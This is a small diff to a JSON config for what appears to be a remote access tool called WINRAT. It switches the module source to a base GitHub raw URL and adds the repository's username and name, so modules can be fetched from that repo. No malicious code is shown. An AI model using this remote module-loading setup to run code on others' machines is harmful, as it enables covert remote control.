@@ -1,6 +1,10 @@
 {
     "threaded_modules": true,
     "modules": {
-        "test_mod": "https://raw.githubusercontent.com/pyscripter99/Modules-for-WINRAT/main/test_mod.py"
+        "test_mod": "https://raw.githubusercontent.com/pyscripter99/Modules-for-WINRAT/main/"
+    },
+    "module_config": {
+        "github_username": "pyscripter99",
+        "github_repo": "Modules-for-WINRAT"
     }
 }
